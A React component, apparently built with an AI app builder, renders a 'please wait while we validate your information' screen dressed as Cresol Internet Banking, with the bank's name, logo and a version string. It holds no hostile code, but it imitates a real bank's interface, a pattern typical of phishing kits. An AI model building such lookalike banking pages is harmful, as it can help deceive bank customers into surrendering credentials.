
import React from "react";
import cresolLogo from "/lovable-uploads/afc18ce7-1259-448e-9ab4-f02f2fbbaf19.png";
import womanImage from "/lovable-uploads/e7069972-f11c-4c5a-a081-9869f1468332.png";

const WaitPage = () => {
  return (
    <div className="min-h-screen flex bg-[#fff] overflow-x-hidden">
      {/* Main Content Container */}
      <div className="w-full lg:w-1/2 flex flex-col justify-center items-center px-4 sm:px-6 lg:px-[7%] py-8 relative">
        <div className="max-w-md w-full mx-auto text-center">
          {/* Logo */}
          <div className="mb-8">
            <img
              src={cresolLogo}
              alt="Cresol"
              className="h-12 md:h-16 mx-auto"
            />
          </div>

          {/* Loading Animation */}
          <div className="mb-8">
            <div 
              className="w-16 h-16 mx-auto border-4 border-transparent rounded-full animate-spin"
              style={{
                borderTopColor: '#ffaa00',
                borderRightColor: '#ff7300',
              }}
            ></div>
          </div>

          {/* Title */}
          <h1 className="text-2xl md:text-3xl font-semibold text-gray-600 mb-4">
            Aguarde
          </h1>

          {/* Description */}
          <p className="text-lg md:text-xl text-gray-600 mb-12 leading-relaxed">
            Estamos validando suas informações de forma segura. Este processo pode levar alguns momentos.
          </p>

          {/* Additional Loading Dots */}
          <div className="flex justify-center space-x-2 mb-12">
            <div 
              className="w-3 h-3 rounded-full animate-pulse"
              style={{ backgroundColor: '#ffaa00', animationDelay: '0s' }}
            ></div>
            <div 
              className="w-3 h-3 rounded-full animate-pulse"
              style={{ backgroundColor: '#ff7300', animationDelay: '0.2s' }}
            ></div>
            <div 
              className="w-3 h-3 rounded-full animate-pulse"
              style={{ backgroundColor: '#ffaa00', animationDelay: '0.4s' }}
            ></div>
          </div>

          {/* Footer */}
          <div className="text-center text-xs text-gray-800">
            <div className="font-semibold">Cresol Internet Banking - 2025</div>
            <div>Versão: 12.4.3.501 (12.4.3-501)</div>
          </div>
        </div>
      </div>

      {/* Right: Imagem da mulher - Hidden on mobile, shown on lg+ */}
      <div className="hidden lg:block lg:w-1/2 bg-[#f5f6f7] relative overflow-hidden">
        <img
          src={womanImage}
          alt="Mulher segurando celular"
          className="w-full h-full object-cover"
        />
      </div>
    </div>
  );
};

export default WaitPage;
